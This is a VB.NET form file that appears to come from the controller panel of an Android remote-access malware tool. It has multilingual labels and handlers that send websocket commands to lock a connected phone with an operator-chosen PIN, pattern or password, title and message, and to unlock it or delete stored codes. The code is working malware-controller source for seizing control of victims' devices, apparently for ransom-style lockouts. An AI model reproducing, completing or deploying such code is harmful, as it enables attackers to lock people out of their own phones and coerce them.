Imports System.Net.Sockets
Imports System.Web.UI.WebControls

Public Class lockscreen
    Public BTcli As BTClient

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                ctrtext.Text = "رمز المرور"
                lcktyplbl.Text = "نوع القفل"
                refbtn.Text = "تحديث"
                delbtn.Text = "حذف الكل"
                lockbtn.Text = "قفل"
                unlockbtn.Text = "إلغاء القفل"
                Exit Select

            Case "CN" ' Chinese
                ctrtext.Text = "密码"
                lcktyplbl.Text = "锁定类型"
                refbtn.Text = "刷新"
                delbtn.Text = "删除所有"
                lockbtn.Text = "锁定"
                unlockbtn.Text = "解锁"
                Exit Select

            Case "RU" ' Russian
                ctrtext.Text = "Код доступа"
                lcktyplbl.Text = "Тип блокировки"
                refbtn.Text = "Обновить"
                delbtn.Text = "Удалить все"
                lockbtn.Text = "Заблокировать"
                unlockbtn.Text = "Разблокировать"
                Exit Select

            Case "TR" ' Turkish
                ctrtext.Text = "Şifre"
                lcktyplbl.Text = "Kilit türü"
                refbtn.Text = "Yenile"
                delbtn.Text = "Tümünü sil"
                lockbtn.Text = "Kilit"
                unlockbtn.Text = "Kilidi aç"
                Exit Select

            Case "SP" ' Spanish
                ctrtext.Text = "Código de acceso"
                lcktyplbl.Text = "Tipo de bloqueo"
                refbtn.Text = "Actualizar"
                delbtn.Text = "Eliminar todo"
                lockbtn.Text = "Bloquear"
                unlockbtn.Text = "Desbloquear"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                ctrtext.Text = "Código de acesso"
                lcktyplbl.Text = "Tipo de bloqueio"
                refbtn.Text = "Atualizar"
                delbtn.Text = "Excluir todos"
                lockbtn.Text = "Bloquear"
                unlockbtn.Text = "Desbloquear"
                Exit Select

                ' Handle any other cases or defaults here
        End Select
    End Sub

    Private Sub inputtext2_TextChanged(sender As Object, e As EventArgs) Handles inputtext2.TextChanged
        If comboTargts.Text <> "Password" Then
            Dim validText As String = ""
            For Each ch As Char In inputtext2.Text
                If Char.IsDigit(ch) Then
                    validText &= ch
                End If
            Next

            ' If the text was modified, update the TextBox
            If inputtext2.Text <> validText Then
                inputtext2.Text = validText
                inputtext2.SelectionStart = validText.Length ' Move cursor to the end
            End If
        End If

    End Sub

    Public Sub switchlock(isLocked As Boolean)
        If isLocked Then

            lockbtn.ForeColor = Color.Gray
            lockbtn.RectColor = Color.Gray
            lockbtn.Enabled = False

            unlockbtn.ForeColor = Color.DodgerBlue
            unlockbtn.RectColor = Color.DodgerBlue
            unlockbtn.Enabled = True

        Else
            unlockbtn.ForeColor = Color.Gray
            unlockbtn.RectColor = Color.Gray
            unlockbtn.Enabled = False

            lockbtn.ForeColor = Color.DodgerBlue
            lockbtn.RectColor = Color.DodgerBlue
            lockbtn.Enabled = True

        End If
    End Sub

    Private Sub lockscreen_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        myico.Image = BTcli.wallpaper
        mytitle.Text = lockmobstr
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles refbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                           {"msg", "lock"},
                           {"cas", "2"}'load
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles delbtn.Click
        If MyMsg.Show(delcodsconfrmstr, $"{Continuestr} ?", msgtype.Confirm, True) = DialogResult.OK Then
            Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "lock"},
                          {"cas", "3"}'load
           }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
            DGV0.Rows.Clear()
        End If
    End Sub

    Private Sub unlockbtn_Click(sender As Object, e As EventArgs) Handles unlockbtn.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                        {"msg", "lock"},
                        {"cas", "0"}'load
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub lockbtn_Click(sender As Object, e As EventArgs) Handles lockbtn.Click
        Dim okpin As String = inputtext2.Text
        If isEmpty(okpin) Then
            If Not MyMsg.Show(emptycodstr, confnocodestr, msgtype.Confirm, True) = DialogResult.OK Then
                Return
            End If
        End If

        Dim locktype As String = "1"

        Select Case comboTargts.Text
            Case "Pattern"
                locktype = "1"
                If Not isEmpty(okpin) Then
                    If okpin.Length < 4 Or okpin.Length > 9 Then
                        BTAlerter.infos(pintypsstr)
                        Return
                    End If
                End If
            Case "Pin"
                locktype = "2"
                If Not isEmpty(okpin) Then
                    If okpin.Length <> 4 AndAlso okpin.Length <> 6 Then
                        BTAlerter.infos(pintypsstr)
                        Return
                    End If
                End If
            Case "Password"
                locktype = "3"
            Case Else
        End Select


        Dim btinput As New myinputs
        btinput.msgtitle.Text = lockinfostr
        btinput.inputtext.Text = ""
        btinput.inputtext2.Text = ""
        btinput.inputtext2.Visible = True
        btinput.checkfolder.Visible = False
        btinput.inputtext.Watermark = locktitstr
        btinput.inputtext2.Watermark = lockmsgstr
        If btinput.ShowDialog <> DialogResult.OK Then
            Return
        End If

        Dim thetitle As String = btinput.inputtext.Text
        Dim themsg As String = btinput.inputtext2.Text


        Dim chatData As New Dictionary(Of String, Object) From {
                       {"msg", "lock"},
                       {"pin", okpin},
                       {"typ", locktype},
                       {"title", thetitle},
                       {"lckdis", themsg},
                       {"cas", "1"}'load
       }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub comboTargts_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboTargts.SelectedIndexChanged
        inputtext2.Text = ""
    End Sub
End Class